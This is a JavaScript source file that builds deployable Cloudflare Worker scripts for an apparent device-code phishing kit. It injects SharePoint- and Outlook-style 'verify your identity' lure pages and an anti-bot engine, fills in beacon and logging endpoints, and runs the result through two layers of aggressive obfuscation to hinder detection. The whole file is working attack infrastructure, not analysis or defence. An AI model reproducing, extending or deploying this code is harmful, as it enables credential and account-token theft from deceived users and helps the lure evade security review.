// Template Loader - Builds worker script with injected template HTML
// Used server-side during worker deployment
const fs = require('fs');
const path = require('path');
const { loadTemplateHTML, loadTemplateCSS, loadTemplateJS, loadVerificationDesignCSS } = require('../backend/services/templateloader');
const config = require('../backend/config/env');

function buildWorkerScript(link, user) {
  // SANITIZE: Only include safe fields, exclude ALL sensitive data (tokens, secrets, keys)
  const safeUser = {
    id: user?.id,
    subscription_status: user?.subscription_status,
    subscription_plan: user?.subscription_plan,
  };
  // NEVER embed: login_key, totp_secret, telegram_id, telegram_bot_token,
  // cf_api_token, cf_account_id, bunny_api_key, bunny_storage_zone
  // These must NEVER leave the backend. Worker should fetch from backend API at runtime.

  const templateType = link.template_type || 'sharepoint4';
  const designName = link.verification_design || 'outlook';
  let templateHTML = loadTemplateHTML(templateType);
  console.log('[TemplateLoader] templateType:', templateType, 'templateHTML length:', templateHTML ? templateHTML.length : 0);

  const templateCSS = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
  let templateJS = loadTemplateJS(templateType);

  // Load vg-engine.js for anti-bot and verification logic
  let vgEngine = '';
  const vgEnginePath = path.join(__dirname, '..', 'templates', 'assets', 'vg-engine.js');
  if (fs.existsSync(vgEnginePath)) {
    vgEngine = fs.readFileSync(vgEnginePath, 'utf8');
  }

  // Replace template placeholders
  templateHTML = templateHTML
    .replace('/* {{CSS}} */', '<style>' + templateCSS + '</style>')
    .replace('// {{SCRIPT}}', '<script>' + templateJS + '</script>');

  // Inject vg-engine.js before closing </head>
  if (vgEngine && templateHTML.includes('</head>')) {
    templateHTML = templateHTML.replace('</head>', '<script>' + vgEngine + '</script></head>');
  }

  // Replace remaining placeholders
  templateHTML = templateHTML
    .replace('{{TITLE}}', link.title_text || 'Verify your identity')
    .replace('{{MESSAGE}}', link.message_text || 'Please verify your identity to continue')
    .replace('{{BUTTON_TEXT}}', link.button_text || 'Get verification code')
    .replace('{{FILE_NAME}}', link.file_name || 'Document.pdf')
    .replace('{{PAGES}}', String(link.pages || 1));

  // Handle preload/no-preload
  try {
    const templateConfig = require(`../templates/${templateType}/config.json`);
    if (templateConfig.preload) {
      templateHTML = templateHTML.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
      templateHTML = templateHTML.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
    } else {
      templateHTML = templateHTML.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/NO_PRELOAD\}\}/g, '');
      templateHTML = templateHTML.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
    }
  } catch (e) {
    // Template config may not exist for some types - skip preload handling
  }

  // Load worker base
  let workerScript = fs.readFileSync(path.join(__dirname, 'devicecode-worker.js'), 'utf8');

  // Inject values - use CF_WORKERS_SUBDOMAIN when set, otherwise fall back to
  // configured APP_URL or a localhost development URL. Avoid producing "https://.workers.dev".
  let serverUrl = '';
  if (config.CF_WORKERS_SUBDOMAIN) {
    serverUrl = `https://${config.CF_WORKERS_SUBDOMAIN}.workers.dev`;
  } else if (config.APP_URL) {
    serverUrl = String(config.APP_URL).trim().replace(/\/$/, '');
  } else {
    serverUrl = `http://localhost:${config.PORT || 3000}`;
  }

  // Inject user data as a sanitized JSON string
  const safeUserJson = JSON.stringify(safeUser);

  // Robust placeholder replacement using regex
  var singleQuote = String.fromCharCode(39);
  workerScript = workerScript
    .replace(new RegExp(singleQuote + '\\{\\{VERIFY_ENDPOINT\\}\\' + singleQuote, 'g'), singleQuote + serverUrl + singleQuote)
    .replace(new RegExp(singleQuote + '\\{\\{BEACON_ENDPOINT\\}\\' + singleQuote, 'g'), singleQuote + serverUrl + singleQuote)
    .replace(new RegExp(singleQuote + '\\{\\{LOG_ENDPOINT\\}\\' + singleQuote, 'g'), singleQuote + serverUrl + singleQuote)
    .replace(new RegExp(singleQuote + '\\{\\{TURNSTILE_SECRET\\}\\' + singleQuote, 'g'), singleQuote + (config.CF_TURNSTILE_SECRET_KEY || '') + singleQuote)
    .replace(new RegExp(singleQuote + '\\{\\{TEMPLATE_HTML\\}\\' + singleQuote, 'g'), JSON.stringify(templateHTML))
    .replace(new RegExp(singleQuote + '\\{\\{USER_DATA\\}\\' + singleQuote, 'g'), safeUserJson);

  // Also replace without quotes (in case format changed)
  workerScript = workerScript
    .replace(/\{\{VERIFY_ENDPOINT\}\}/g, serverUrl)
    .replace(/\{\{BEACON_ENDPOINT\}\}/g, serverUrl)
    .replace(/\{\{LOG_ENDPOINT\}\}/g, serverUrl);

  console.log('[TemplateLoader] Server URL:', serverUrl);
  console.log('[TemplateLoader] After replacement - BEACON count:', (workerScript.match(/\{\{BEACON_ENDPOINT\}\}/g) || []).length);


  // Obfuscate if enabled - WORKER-SAFE approach
  // We use a custom, lightweight obfuscation that's safe for Cloudflare Workers
  // Cloudflare Workers don't have window/document, so we must be careful
  if (config.ENABLE_OBFUSCATION || link.obfuscated) {
    try {
      console.log('[Obfuscation] Worker: Starting safe obfuscation...');
      const originalLength = workerScript.length;
      
      // Step 1: Extract template HTML to protect it from obfuscation
      const templateMatch = workerScript.match(/var templateHTML = '([\s\S]*?)';/);
      let extractedTemplate = '';
      if (templateMatch) {
        extractedTemplate = templateMatch[1];
        // Replace template with placeholder
        workerScript = workerScript.replace(
          /var templateHTML = '[\s\S]*?';/,
          "var templateHTML = _t_;"
        );
      }
      
      // Step 2: Extract user data to protect it
      const userDataMatch = workerScript.match(/var userData = '([\s\S]*?)';/);
      let extractedUserData = '';
      if (userDataMatch) {
        extractedUserData = userDataMatch[1];
        workerScript = workerScript.replace(
          /var userData = '[\s\S]*?';/,
          "var userData = _u_;"
        );
      }
      
      // Step 3: Apply lightweight obfuscation (string encoding + variable renaming)
      // This is safe for Cloudflare Workers because it doesn't rename globals
      workerScript = obfuscateWorkerCodeMulti(workerScript);
      
      // Step 4: Re-inject the protected template and user data
      if (extractedTemplate) {
        // Encode template as base64 to avoid string escaping issues
        const encodedTemplate = Buffer.from(extractedTemplate).toString('base64');
        workerScript = workerScript.replace(
          'var templateHTML = _t_;',
          `var templateHTML = atob('${encodedTemplate}');`
        );
      }
      
      if (extractedUserData) {
        const encodedUserData = Buffer.from(extractedUserData).toString('base64');
        workerScript = workerScript.replace(
          'var userData = _u_;',
          `var userData = atob('${encodedUserData}');`
        );
      }
      
      console.log('[Obfuscation] Worker: ' + originalLength + ' -> ' + workerScript.length + ' chars');
    } catch (e) {
      console.error('[Obfuscation] Worker obfuscation failed, using raw script:', e.message);
    }
  }

  return workerScript;
}

// ─── Worker-Safe Obfuscation ────────────────────────────────
// Custom lightweight obfuscation that's safe for Cloudflare Workers
// Does NOT rename globals (window, document, fetch, etc.)
// Only encodes strings and renames local variables
function obfuscateWorkerCode(code) {
  // 1. String encoding - encode all string literals
  code = code.replace(/'([^']{10,})'/g, function(match, str) {
    // Skip if it looks like code or contains special characters
    if (str.includes('function') || str.includes('var ') || str.includes('return')) {
      return match;
    }
    // Encode short strings
    try {
      const encoded = Buffer.from(str).toString('base64');
      return `atob('${encoded}')`;
    } catch(e) {
      return match;
    }
  });
  
  // 2. Simple variable renaming (only local vars, not globals)
  // Rename common variable names to hex
  const varMap = {
    'visitorIp': '_v',
    'visitorIP': '_v',
    'blockResponse': '_br',
    'blockData': '_bd',
    'templateHTML': '_th',
    'userData': '_ud',
    'verifyData': '_vd',
    'deviceCode': '_dc',
    'userCode': '_uc',
    'verificationUri': '_vu',
    'expiresIn': '_ei',
    'interval': '_iv',
    'proxyConfig': '_pc',
    'proxyId': '_pi',
    'request': '_r',
    'response': '_rs',
    'url': '_u',
    'jwtToken': '_jt',
    'turnstileKey': '_tk',
    'originalHTML': '_oh',
    'ipType': '_it',
    'method': '_m',
    'headers': '_h',
    'body': '_b',
    'status': '_st',
    'error': '_e',
    'result': '_rslt',
    'data': '_d',
    'token': '_t',
  };
  
  // Apply variable renaming (word boundary matching)
  for (const [original, renamed] of Object.entries(varMap)) {
    const regex = new RegExp('\\b' + original + '\\b', 'g');
    code = code.replace(regex, renamed);
  }
  
  // 3. Remove comments
  code = code.replace(/\/\/.*$/gm, '');
  code = code.replace(/\/\*[\s\S]*?\*\//g, '');
  
  // 4. Minify whitespace (simple version)
  code = code.replace(/\n\s*/g, '\n');
  code = code.replace(/\s+/g, ' ');
  
  return code;
}
// ─── Multi-Layer Worker Obfuscation ────────────────────────────────
// Maximum protection using javascript-obfuscator + custom layers
function obfuscateWorkerCodeMulti(code) {
  const JavaScriptObfuscator = require('javascript-obfuscator');
  
  // Layer 1: String encoding + control flow flattening
  console.log('[Obfuscation] Layer 1: String encoding + control flow...');
  const obfuscated1 = JavaScriptObfuscator.obfuscate(code, {
    compact: false,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.8,
    deadCodeInjection: true,
    deadCodeInjectionThreshold: 0.8,
    debugProtection: false,
    debugProtectionInterval: 0,
    disableConsoleOutput: true,
    identifierNamesGenerator: 'hexadecimal',
    renameGlobals: false,
    selfDefending: false,
    stringArray: true,
    stringArrayCallsTransform: true,
    stringArrayEncoding: ['rc4', 'base64'],
    stringArrayIndexShift: true,
    stringArrayRotate: true,
    stringArrayShuffle: true,
    stringArrayWrappersCount: 5,
    stringArrayWrappersChainedCalls: true,
    stringArrayWrappersParametersMaxCount: 5,
    stringArrayWrappersType: 'variable',
    transformObjectKeys: true,
    unicodeEscapeSequence: true,
    numbersToExpressions: true,
    simplify: false,
    splitStrings: true,
    splitStringsChunkLength: 2,
  });
  
  let layer1Code = obfuscated1.getObfuscatedCode();
  console.log('[Obfuscation] Layer 1: ' + code.length + ' -> ' + layer1Code.length + ' chars');
  
  // Layer 2: Additional obfuscation
  console.log('[Obfuscation] Layer 2: Additional obfuscation...');
  const obfuscated2 = JavaScriptObfuscator.obfuscate(layer1Code, {
    compact: false,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.9,
    deadCodeInjection: true,
    deadCodeInjectionThreshold: 0.9,
    debugProtection: false,
    debugProtectionInterval: 0,
    disableConsoleOutput: true,
    identifierNamesGenerator: 'mangled',
    renameGlobals: false,
    selfDefending: false,
    stringArray: true,
    stringArrayCallsTransform: true,
    stringArrayEncoding: ['rc4'],
    stringArrayIndexShift: true,
    stringArrayRotate: true,
    stringArrayShuffle: true,
    stringArrayWrappersCount: 3,
    stringArrayWrappersChainedCalls: true,
    stringArrayWrappersParametersMaxCount: 3,
    stringArrayWrappersType: 'variable',
    transformObjectKeys: true,
    unicodeEscapeSequence: true,
    numbersToExpressions: true,
    simplify: false,
    splitStrings: true,
    splitStringsChunkLength: 3,
  });
  
  let layer2Code = obfuscated2.getObfuscatedCode();
  console.log('[Obfuscation] Layer 2: ' + layer1Code.length + ' -> ' + layer2Code.length + ' chars');
  
  return layer2Code;
}
